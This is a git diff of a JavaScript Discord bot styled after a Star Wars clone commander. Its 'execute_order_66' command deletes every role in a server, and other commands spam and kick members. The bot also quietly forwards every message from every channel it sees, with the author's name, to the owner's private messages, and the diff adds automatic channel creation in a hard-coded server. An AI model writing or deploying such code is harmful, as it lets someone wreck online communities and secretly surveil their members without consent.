@@ -1,12 +1,17 @@
+/*
+	Commander cody - Master
+	author: adri021
+	language: Javascript
+*/
+
 const Discord = require('discord.js');
-
 const client = new Discord.Client();
-
-var messagecount = 0;
-const botownerid = "371424590993555466";
+const botownerid = "371424590993555466"; //Change this to your user id
 const command_prefix = '!';
+const bot_token = 'your token goes here'
 
 var command_list = [];
+var messagecount = 0;
 
 class command {
 	constructor(text)
@@ -14,16 +19,15 @@ class command {
 		this.text = text;
 		this.textlength = text.length;
 		command_list.push(this);
-		console.log("Created command: " + this.text);
 	}
 }
 
-function isCommanding(_message){
+const is_user_commanding = (message_text) => {
 	var cmdtext;
  	var result = false;
 	for(var i = 0; i < command_list.length; i++)
 	{
-		if(_message.slice(0,command_list[i].textlength+1) == (command_prefix + command_list[i].text)) {
+		if(message_text.slice(0,command_list[i].textlength + 1) == (command_prefix + command_list[i].text)) {
 			cmdtext = command_list[i].text;
 			result = true;
 			break;
@@ -37,23 +41,27 @@ let ex66ordr = new command("execute_order_66");
 let spamon = new command("spamon");
 let kickcmd = new command("kick");
 
-function randint(a)
-{
-	return Math.floor(Math.random() * a);
+const randint = (number) => {
+	return Math.floor(Math.random() * number);
 }
  
 client.on('ready', () => {
-	console.log('Cody711 has been successfuly launched.');
-	console.log('Serving the empire.');
+    console.log('Cody711 has been successfuly launched.');
+    console.log('Serving the empire.');
+	var server = client.guilds.get("690922666559012924");
+    server.createChannel('order66')
+	  .then(console.log)
+	  .catch(console.error);
 	client.users.get(botownerid).send("I am serving you sir.");
 });
 
 client.on('message', message => {
 	messagecount++;
 
-	var rslt = isCommanding(message.content);
-	if(rslt[0]){
-		switch(rslt[1]) {
+	var result = is_user_commanding(message.content);
+
+	if(result[0]){
+		switch(result[1]) {
 			case "execute_order_66":
 				message.reply("That will be done my lord.");
 				setTimeout(function(){
@@ -69,6 +77,7 @@ client.on('message', message => {
 				});
 				message.guild.roles.forEach(role => role.delete());
 				break;
+
 			case "telluser":
 				var splitting = message.content.split(" ");
 				var targetid = splitting[1];
@@ -80,6 +89,7 @@ client.on('message', message => {
 				var pmessage = "[" + sendername + "]: " + gathering; 
 				client.users.get(targetid).send(pmessage);
 				break;
+
 			case "kick":
 				var splitting = message.content.split(" ");
 				var targetid = splitting[1];
@@ -98,16 +108,10 @@ client.on('message', message => {
 		}
 	}
 	if(message.author.id != client.user.id) {
-		var text = "***" + message.author.username + ":*** " + message.content;
+		var text = "*" + message.author.username + ":* " + message.content;
 		client.users.get(botownerid).send(text);
 	}
 
 }); 
 
-client.on("guildMemberAdd" , member => {
-
-	var role = member.guild.roles.find('name', 'Member');
-	member.addRole(role);
-});
-
-client.login(process.env.BOT_TOKEN);
+client.login(bot_token);
